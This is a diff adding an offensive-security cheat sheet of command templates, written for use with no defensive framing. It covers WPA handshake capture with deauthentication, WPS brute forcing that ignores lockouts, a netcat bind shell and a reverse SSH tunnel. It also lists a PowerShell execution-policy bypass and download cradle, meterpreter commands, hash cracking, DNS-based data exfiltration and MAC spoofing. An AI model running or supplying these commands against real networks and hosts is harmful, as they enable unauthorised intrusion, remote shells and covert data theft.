@@ -1,0 +1,117 @@
+
+----| WIFI |----
+airmon-ng start <inf>
+airodump-ng <inf>
+
+===| WPA handshake Cap |===
+airodump-ng -d <target_AP_mac> -c <chan> -w <cap_prefix> <inf>
+aireplay-ng -0 <packet_count> -a <AP_mac> -c <attach_client_mac> <inf>
+aircrack-ng -b <AP_mac> -w <wordlist> <pcap_file>
+	###| for very large lists |###
+	OR cat <wordlist> | aircrack-ng -b <AP_mac> -w - <pcap_file>
+
+===| reaver WPS crack |===
+reaver -a -b <AP_mac> -c <chan> -i <inf>
+	###| Useful options |###
+	-N	no nacks
+	-S	dh-small, faster cracking
+	-L	ignore AP lockout
+	-E 	EAP termination with FAIL
+	-w	act like windows
+	-l	delay after lock detection, in secs
+	-x	after 10 failures wait, in secs
+	-d 	delay per attempt
+	-v 	verbose
+	-s 	load session file
+
+===| wireshark |===
+wps.wifi_protected_setup_state == 2
+eth.addr==<mac>
+eapol
+
+---| SSH tunnels |---
+ssh -fN -R 9922:localhost:22 user@host
+
+
+---| JS inject |---
+javascript:alert(document.forms[0].name.options[0].value=”blah”)
+
+---| HTTP |---
+telnet IP 80
+GET page HTTP/1.1
+HOST: domain
+<enter>
+
+---| windows |---
+runas /savecred /user:<username> <prog>
+
+===| powershell |===
+powershell -executionpolicy <bypass||unrestricted> <script>
+start-process <exec> -verb runas
+
++++| web download |+++
+$src = <url>
+$dst = <loc>
+$web = New-Object System.Net.Webclient
+$web.DownloadFile($src, $dst)
+$web.UploadFile($src, $dst)
+
+---| misc |---
+mitm
+etter inject html/js,update
+
+---| netcat |---
+~ncat
+target: netcat -l -p <port> -e <shell>
+attacker: netcat <target ip> <port>
+netcat host port < file
+
+---| nmap |---
+nmap -sSU -sP -PS20,21,22,23,25,37,53,57,110,135,137,139,80,8080, -p U:53,67,68,69,111,123,137,161,T:21-25,80,110,115,135,137,138,139,162,179,389,443,445,1521,3389,5432,8080
+
+---| meterpreter |---
+execute -f cmd.exe -i -H
+
+---| exploit |---
+flawfinder
+
+---| nix cmds |---
+find / -type f -perm -o+rx
+printenv; env; set;
+sed "s/$oldpass/$newpass/" or sed "s#$oldpass#$newpass#"
+
+---| john |---
+john --crack-status --pot=name --session=name
+
+---| hashcat |---
+hashcat -a <attack> -m <hashid> <hash file> <wordlist>
+
+---| file transfer |---
+cat <file> | ssh user@host 'cat > file'
+
+---| nessus |---
+nessuscmd -sS -v -p <port> -i <plugin> <IP>
+
+---| DNS |---
+
++++| Data Exfil |+++
+for line in `gzip -c <file> | xxd -p`; do dig $line.<domain>; done;
+
++++| File Download |+++
+on controlled DNS server define TXT with ascii coded data
+nslookup DNS TXT
+decode ascii to binary
+
+---| spoof |---
+
+===| MAC |===
+
++++| ifconfig |+++
+ifconfig <inf> down
+ifconfig <inf> hw ether <new MAC>
+ifconfig <inf> up
+
++++| ip |+++
+ip link set dev <INF> down
+ip link set dev <INF> address <new MAC>
+ip link set dev <INF> up
